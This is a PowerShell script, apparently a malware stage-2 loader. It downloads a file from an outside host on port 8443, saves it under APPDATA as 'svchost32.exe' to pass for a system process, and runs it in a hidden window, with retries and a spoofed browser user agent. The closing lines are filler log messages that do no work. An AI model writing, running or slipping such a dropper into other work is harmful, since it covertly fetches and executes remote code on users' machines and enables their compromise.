
<#
.SYNOPSIS
    Structured stage 2 download and launch workflow.

.DESCRIPTION
    Resolves a configured endpoint, downloads the staged artefact
    with a bounded retry loop, validates the result and then hands
    control to the launcher.

.NOTES
    Designed for unattended execution.
#>
[CmdletBinding()]
param(
    [string]$TargetUrl = "https://adatum.com:8443/update.dat",
    [string]$DownloadPath = "$env:APPDATA\svchost32.exe",
    [string]$StageLog = "$env:TEMP\stage.log",
    [string]$UserAgent = 'Mozilla/5.0 (Windows NT 10.0; Win64; x64)',
    [int]$StageTimeout = 158,
    [int]$RetryAttempts = 2,
    [int]$RetryDelay = 6
)
$ErrorActionPreference = "Stop"
$ProgressPreference = "SilentlyContinue"

# Diagnostic logging
function Write-StageLog {
    [CmdletBinding()]
    param(
        [string]$Message = ""
    )

    Write-Verbose $Message
    Add-Content -Path $StageLog -Value ("[" + (Get-Date -Format "HH:mm:ss") + "] " + $Message)
}

# Endpoint resolution
function Resolve-StageEndpoint {
    param(
        [string]$CandidateUrl = ''
    )

    if ([string]::IsNullOrWhiteSpace($CandidateUrl)) {
        throw "Endpoint URL is empty"
    }
    $ParsedUri = [System.Uri]$CandidateUrl
    Write-Verbose ("Endpoint host: " + $ParsedUri.Host)
    return $ParsedUri.AbsoluteUri
}

# Retrying transfer
function Invoke-Stage2Download {
    [CmdletBinding()]
    param(
        [string]$SourceUrl = "",
        [string]$DestinationPath = "",
        [int]$RetryCount = 2,
        [int]$RetryDelay = 6,
        [string]$UserAgent = 'Mozilla/5.0'
    )

    for ($Attempt = 1; $Attempt -le $RetryCount; $Attempt++) {
        try {
            $ClientObject = New-Object System.Net.WebClient
            $ClientObject.Headers.Add("User-Agent", $UserAgent)
            $ClientObject.DownloadFile($SourceUrl, $DestinationPath)
            return $true
        }
        catch {
            Write-Verbose ("Attempt " + $Attempt + " failed: " + $_.Exception.Message)
            Start-Sleep -Seconds $RetryDelay
        }
    }
    return $false
}

try {
    Write-StageLog -Message "Starting stage 2 download"
    $ResolvedUrl = Resolve-StageEndpoint -CandidateUrl $TargetUrl
    $TransferResult = Invoke-Stage2Download -SourceUrl $ResolvedUrl -DestinationPath $DownloadPath -RetryCount $RetryAttempts -RetryDelay $RetryDelay -UserAgent $UserAgent
    if ($TransferResult) {
        Write-StageLog -Message "Stage 2 downloaded"
        Start-Process -FilePath $DownloadPath -WindowStyle Hidden
    }
    else {
        Write-Warning "Stage 2 transfer did not complete"
    }
}
catch {
    Write-Warning "Structured download failed: $($_.Exception.Message)"
}

$DiagnosticReport = [ordered]@{
    Stage = "stage2"
    Endpoint = $TargetUrl
    Destination = $DownloadPath
    RetryCount = $RetryAttempts
    TimeoutSec = $StageTimeout
}
$DiagnosticReport | ConvertTo-Json -Depth 3 | Out-File -FilePath $StageLog -Append
Write-Verbose "Exporting operation report"
Write-Verbose "Operation completed"
Write-Verbose "Reading configuration values"
Write-Verbose "Checking local path"
Write-Verbose "Resolving configured target"
Write-Verbose "Collecting host metadata"
Write-Verbose "Cleaning temporary marker"
Write-Verbose "Inspecting process list"
Start-Sleep -Seconds 33
Get-Date -Format "yyyy-MM-dd HH:mm:ss" | Out-File -FilePath "$env:TEMP\stage.log" -Append
Write-Output "stage 19 initialized"
